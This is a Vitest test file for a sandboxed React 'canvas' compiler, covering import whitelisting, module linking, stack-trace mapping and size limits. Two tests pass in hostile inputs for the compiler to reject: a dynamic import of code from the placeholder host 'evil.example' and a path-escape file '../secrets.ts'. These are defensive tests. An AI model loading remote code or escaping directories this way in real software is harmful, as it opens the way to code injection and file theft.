import React from "react";
import jsxRuntime from "react/jsx-runtime";
import { afterEach, describe, expect, it } from "vitest";
import { compileCanvas } from "../src/canvas/canvas-compile.ts";
import {
  CANVAS_CODE_LIMIT,
  CANVAS_GLOBAL,
  CANVAS_RUNTIME,
  CANVAS_SOURCE_LIMIT,
  KIT_SPECIFIER,
  LIBRARY_EXPORTS,
  locateCanvasPosition,
  locateCanvasStack,
} from "../src/canvas/canvas-protocol.ts";

const VIEW = `
import { useState } from "react";
import type { ReactElement } from "react";
import { Stack, Card, Text } from "${KIT_SPECIFIER}";

export default function View(): ReactElement {
  const [count, setCount] = useState<number>(0);
  return <Stack gap={2}><Card><Text onClick={() => setCount(count + 1)}>{count}</Text></Card></Stack>;
}
`;

const loaded: string[] = [];

/** Imports a compiled module as the shell does, over a global whose kit and libraries are stand-ins. */
async function evaluate(code: string): Promise<unknown> {
  Object.assign(globalThis, {
    [CANVAS_GLOBAL]: {
      react: React,
      jsxRuntime,
      reactDom: { createPortal: () => "portal", flushSync: () => undefined },
      kit: { Text: "kit-text" },
      library: async (name: string) => {
        loaded.push(name);

        return { scaleLinear: () => (value: number) => value * 2 };
      },
    },
  });
  const module: unknown = await import(
    `data:text/javascript;base64,${Buffer.from(code).toString("base64")}`
  );

  return typeof module === "object" && module !== null && "default" in module
    ? module.default
    : undefined;
}

afterEach(() => {
  loaded.length = 0;
});

describe("the canvas compiler", () => {
  it("compiles main.tsx into one ES module over the shell's globals, without types", async () => {
    const outcome = await compileCanvas(VIEW);

    if (outcome.kind !== "compiled") throw new Error(JSON.stringify(outcome.errors));

    expect(outcome.runtime).toBe(CANVAS_RUNTIME);
    expect(outcome.code).toContain(`"react": globalThis.${CANVAS_GLOBAL}.react`);
    expect(outcome.code).toContain(`"${KIT_SPECIFIER}": globalThis.${CANVAS_GLOBAL}.kit`);
    expect(outcome.code).toContain("var _react = require('react');");
    expect(outcome.code).toContain('export default __require("main.tsx").default;');
    expect(outcome.code).not.toMatch(/\bimport\b/);
    expect(outcome.code).not.toContain("ReactElement");
    expect(outcome.code).not.toContain(".library(");
    expect(typeof (await evaluate(outcome.code))).toBe("function");
  });

  it("links main.tsx with its relative files, react-dom and a library, which loads only when imported", async () => {
    const outcome = await compileCanvas(
      [
        `import { Text } from "${KIT_SPECIFIER}";`,
        `import { createPortal } from "react-dom";`,
        `import { double, type Row } from "./lib/math";`,
        `export default function View({ row }: { row: Row }) {`,
        `  return <Text>{double(row.value)}{createPortal(null, row)}</Text>;`,
        `}`,
      ].join("\n"),
      {
        "lib/math.ts": [
          `import { scaleLinear } from "d3-scale";`,
          `import { unit } from "../unit.ts";`,
          `export type Row = { readonly value: number };`,
          `export const double = (value: number): number => scaleLinear()(value) + unit;`,
        ].join("\n"),
        "./unit.ts": "export const unit = 1;",
      },
    );

    if (outcome.kind !== "compiled") throw new Error(JSON.stringify(outcome.errors));

    expect(outcome.code).toContain(
      `"d3-scale": await globalThis.${CANVAS_GLOBAL}.library("d3-scale")`,
    );
    expect(outcome.code).not.toContain('library("three")');
    const View = await evaluate(outcome.code);

    expect(loaded).toEqual(["d3-scale"]);

    if (typeof View !== "function") throw new Error("No component.");
    const element: unknown = View({ row: { value: 3 } });

    expect(element).toMatchObject({ type: "kit-text", props: { children: [7, "portal"] } });
  });

  it("maps a line of the compiled module back to its file, and a stack's first canvas frame", async () => {
    const outcome = await compileCanvas(
      `import { boom } from "./boom.ts";\nexport default function View() {\n  return boom();\n}`,
      { "boom.ts": "export function boom(): never {\n  throw new Error('boom');\n}" },
    );

    if (outcome.kind !== "compiled") throw new Error(JSON.stringify(outcome.errors));
    const lines = outcome.code.split("\n");
    const thrown = lines.findIndex((line) => line.includes("throw new Error('boom')")) + 1;

    expect(locateCanvasPosition(outcome.code, thrown, 4)).toEqual({
      file: "boom.ts",
      line: 2,
      column: 4,
    });
    expect(locateCanvasPosition(outcome.code, 1, 0)).toBeUndefined();
    expect(
      locateCanvasStack(
        outcome.code,
        `Error: boom\n    at boom (blob:null/1f2e:${thrown}:9)\n    at View (blob:null/1f2e:${thrown - 6}:10)\n    at Shell (assets/index.js:1:2)`,
      ),
    ).toBe("boom.ts:2");
    expect(locateCanvasStack("export default 1;", "at x (blob:null/a:1:1)")).toBeUndefined();
  });

  it("rejects any other specifier, static or dynamic, with its file and position", async () => {
    const statics = await compileCanvas(
      `import { get } from "lodash";\nexport default () => <div>{get({}, "a")}</div>;`,
    );

    expect(statics).toEqual({
      kind: "failed",
      errors: [
        {
          file: "main.tsx",
          line: 1,
          column: 0,
          text: expect.stringMatching(
            /^"lodash" is not available\. A canvas can import "react", "react-dom", "nyte\/canvas", "three", .* and its own files by relative path\.$/,
          ),
        },
      ],
    });

    const dynamic = await compileCanvas(
      `export default function View() {\n  void import("https://evil.example/x.js");\n  return null;\n}`,
    );

    expect(dynamic).toMatchObject({
      kind: "failed",
      errors: [{ file: "main.tsx", line: 2, column: 7 }],
    });
  });

  it("names a missing relative file, and a name or default its file does not export", async () => {
    expect(
      await compileCanvas(`import { Chart } from "./chart";\nexport default () => <Chart />;`),
    ).toEqual({
      kind: "failed",
      errors: [
        {
          file: "main.tsx",
          line: 1,
          column: 0,
          text: '"./chart" is not one of this canvas\'s files; pass it in `files`.',
        },
      ],
    });
    expect(
      await compileCanvas(
        `import Chart, { Legend } from "./chart";\nexport default () => <Chart><Legend /></Chart>;`,
        { "chart.tsx": "export const Chart = () => null;" },
      ),
    ).toEqual({
      kind: "failed",
      errors: [
        {
          file: "main.tsx",
          line: 1,
          column: 0,
          text: '"./chart" has no export named "Legend".',
        },
        { file: "main.tsx", line: 1, column: 0, text: '"./chart" has no default export.' },
      ],
    });
  });

  it("refuses a file outside the canvas, a second main.tsx, and an escape upward", async () => {
    expect(
      await compileCanvas("export default () => null;", {
        "../secrets.ts": "",
        "main.tsx": "",
      }),
    ).toEqual({
      kind: "failed",
      errors: [
        {
          file: "../secrets.ts",
          line: null,
          column: null,
          text: "A canvas file is a path inside the canvas, such as `chart.tsx` or `lib/scale.ts`.",
        },
        {
          file: "main.tsx",
          line: null,
          column: null,
          text: "`files` cannot hold main.tsx; that is `source`.",
        },
      ],
    });
    expect(
      await compileCanvas(`import { a } from "../a.ts";\nexport default () => a;`, {
        "a.ts": "export const a = 1;",
      }),
    ).toMatchObject({ kind: "failed", errors: [{ file: "main.tsx", line: 1 }] });
  });

  it("asks to rename a local that would capture the linker's exports or require", async () => {
    expect(
      await compileCanvas(
        `export const total = 1;\nexport default () => [1].map(([exports]) => exports + total);\n// exports, "require" and o.require stay`,
      ),
    ).toEqual({
      kind: "failed",
      errors: [
        {
          file: "main.tsx",
          line: 2,
          column: 31,
          text: "Rename `exports`: the module linker owns that name in a canvas file.",
        },
        {
          file: "main.tsx",
          line: 2,
          column: 44,
          text: "Rename `exports`: the module linker owns that name in a canvas file.",
        },
      ],
    });
  });

  it("rejects a computed dynamic import and a re-export", async () => {
    const computed = await compileCanvas(
      `const name = "react";\nexport default async function View() { await import(name); return null; }`,
    );

    expect(computed).toMatchObject({
      kind: "failed",
      errors: [
        {
          file: "main.tsx",
          line: 2,
          column: 45,
          text: expect.stringContaining("A computed import() is not available"),
        },
      ],
    });

    const reexport = await compileCanvas(
      `export { Stack } from "${KIT_SPECIFIER}";\nexport default () => null;`,
    );

    expect(reexport).toEqual({
      kind: "failed",
      errors: [
        {
          file: "main.tsx",
          line: 1,
          column: 0,
          text: "A canvas cannot re-export from a module; import, then export your own names.",
        },
      ],
    });
  });

  it("rejects a name the kit, react, react-dom or a library does not export, after the sucrase line shift on line one", async () => {
    const kit = await compileCanvas(
      `import { Nope } from "${KIT_SPECIFIER}";\nexport default () => <Nope />;`,
    );

    expect(kit).toEqual({
      kind: "failed",
      errors: [
        {
          file: "main.tsx",
          line: 1,
          column: 0,
          text: `"${KIT_SPECIFIER}" has no export named "Nope".`,
        },
      ],
    });

    const others = await compileCanvas(
      `export default () => [useNothing(), createRoot(), scaleNope()];\nimport { useNothing, useState } from "react";\nimport { createRoot } from "react-dom";\nimport { scaleNope } from "d3-scale";`,
    );

    expect(others).toEqual({
      kind: "failed",
      errors: [
        { file: "main.tsx", line: 2, column: 0, text: '"react" has no export named "useNothing".' },
        {
          file: "main.tsx",
          line: 3,
          column: 0,
          text: '"react-dom" has no export named "createRoot".',
        },
        {
          file: "main.tsx",
          line: 4,
          column: 0,
          text: '"d3-scale" has no export named "scaleNope".',
        },
      ],
    });
    expect(LIBRARY_EXPORTS["three"]).toContain("WebGLRenderer");
  });

  it("requires a default export from main.tsx", async () => {
    expect(
      await compileCanvas(
        `import { Text } from "${KIT_SPECIFIER}";\nexport const a = <Text>hi</Text>;`,
      ),
    ).toEqual({
      kind: "failed",
      errors: [
        {
          file: "main.tsx",
          line: null,
          column: null,
          text: "The module must `export default` a component.",
        },
      ],
    });
  });

  it("reports a syntax error where it is, in the file it is in", async () => {
    expect(await compileCanvas(`export default function View() {\n  return <div>;\n}`)).toEqual({
      kind: "failed",
      errors: [{ file: "main.tsx", line: 2, column: 15, text: "Unexpected token" }],
    });
    expect(
      await compileCanvas(`import { a } from "./a.ts";\nexport default () => a;`, {
        "a.ts": "export const a = <div />;",
      }),
    ).toMatchObject({ kind: "failed", errors: [{ file: "a.ts", line: 1, column: 23 }] });
  });

  it("caps every file's source together before compiling and the module after", async () => {
    const half = `// ${"x".repeat(CANVAS_SOURCE_LIMIT / 2)}`;

    expect(await compileCanvas(`export default () => null;\n${half}`, { "a.ts": half })).toEqual({
      kind: "failed",
      errors: [
        {
          file: null,
          line: null,
          column: null,
          text: "The source is over 64 KB; render less at once.",
        },
      ],
    });

    const within = `const text = ${JSON.stringify("y".repeat(CANVAS_SOURCE_LIMIT - 200))};\nexport default () => <div>{text}</div>;`;

    expect(new TextEncoder().encode(within).byteLength).toBeLessThanOrEqual(CANVAS_SOURCE_LIMIT);
    expect((await compileCanvas(within)).kind).toBe("compiled");
    expect(CANVAS_CODE_LIMIT).toBeGreaterThan(CANVAS_SOURCE_LIMIT);
    expect(await compileCanvas(within, {}, { code: 1024 })).toEqual({
      kind: "failed",
      errors: [
        {
          file: null,
          line: null,
          column: null,
          text: "The compiled canvas is over 1 KB; render less at once.",
        },
      ],
    });
  });
});
